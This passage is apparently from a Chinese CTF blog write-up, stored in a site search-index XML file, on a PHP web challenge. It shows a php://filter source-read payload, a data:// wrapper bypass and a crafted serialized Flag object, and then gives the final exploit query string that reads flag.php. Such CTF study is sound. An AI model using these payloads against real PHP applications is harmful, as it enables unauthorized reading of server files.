$password;&#125;</code></pre>这里使用正则过滤掉了关键字flag，但是给了我们提示useless.php，并且使用了include()这个较为危险的函数，我们可以使用php伪协议filter来对useless.php文件进行读取。传入参数如下：<br><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code><br>拼接上前面的参数text得到base64编码的useless.php源码：<pre><code>PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</code></pre>base64解码：<pre><code>&lt;?phpclass Flag&#123;  //flag.php  public $file;  public function __tostring()&#123;      if(isset($this-&gt;file))&#123;          echo file_get_contents($this-&gt;file);          echo &quot;&lt;br&gt;&quot;;      return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);      &#125;  &#125;&#125;?&gt;</code></pre></li><li>第三处绕过<br><code>$password = unserialize($password);</code><br>这里对我们传入的password变量进行了反序列化，那么我们传入的password一定是序列化过后的对象，由于我们在usele.php中获取到了一个Flag类，所以可以在本地new一个flag对象并把它序列化输出。代码如下：<pre><code>&lt;?phpclass Flag&#123;  //flag.php  public $file=&#39;flag.php&#39;; //注意这里要对file赋值flag.php  public function __tostring()&#123;      if(isset($this-&gt;file))&#123;          echo file_get_contents($this-&gt;file);          echo &quot;&lt;br&gt;&quot;;      return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);      &#125;  &#125;&#125;$password = new Flag();$password = serialize($password);echo $password;?&gt;</code></pre>得到序列化后的结果：<br><code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></li></ul><p>所以最终的payload为：</p><pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><p>最后在源码中得到flag。</p><h2 id="0x02知识点"><a href="#0x02知识点" class="headerlink" title="0x02知识点"></a>0x02知识点</h2><p><strong>1.data://伪协议写入文件；</strong><br><strong>2.php://filter伪协议读取文件/源码；</strong><br><strong>3.php序列化与反序列化。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> 代码审计 </tag>
+            
+            <tag> php反序列化 </tag>
+            
+            <tag> php伪协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
